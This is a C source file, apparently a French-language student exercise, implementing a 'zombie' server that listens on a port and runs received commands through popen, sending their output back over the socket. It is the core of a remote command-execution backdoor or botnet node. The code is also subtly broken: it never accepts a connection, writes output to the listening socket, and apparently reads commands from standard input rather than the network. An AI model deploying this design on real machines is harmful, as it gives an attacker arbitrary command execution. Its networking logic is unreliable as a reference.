#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdbool.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/shm.h>

#include "utils_v2.h"

#define BACKLOG 5
#define BUFFER_SIZE 256

int init_zombie_server(int port)
{
    int sockfd = ssocket();
    sbind(port, sockfd);
    slisten(sockfd, BACKLOG);
    return sockfd;
}

int execute_command(int client_socket, char *command)
{
    char *buffer = (char *)malloc(BUFFER_SIZE * sizeof(char));
    if (buffer == NULL)
    {
        perror("Erreur lors de l'allocation de mémoire pour le buffer");
        return -1;
    }

    FILE *pipe = popen(command, "r");
    if (pipe == NULL)
    {
        free(buffer);
        return -1;
    }

    memset(buffer, 0, BUFFER_SIZE);

    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL)
    {
        ssize_t num_written = write(client_socket, buffer, strlen(buffer));
        if (num_written < 0)
        {
            pclose(pipe);
            free(buffer);
            return -1;
        }
        memset(buffer, 0, BUFFER_SIZE);
    }

    pclose(pipe);
    free(buffer);
    return 0;
}

int disconnect_client(int client_socket)
{
    close(client_socket);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = str_to_int(argv[1]);

    int client_socket = init_zombie_server(port);
    printf("Connexion établie avec le contrôleur.\n");

    char command[256];
    while (1)
    {
        int num_read = readLimitedLine(command, sizeof(command));
        if (num_read == 0)
        {
            printf("Déconnexion du contrôleur.\n");
            break;
        }

        int result = execute_command(client_socket, command);
        if (result == -1)
        {
            fprintf(stderr, "Erreur lors de l'exécution de la commande.\n");
            break;
        }
    }

    disconnect_client(client_socket);
    return 0;
}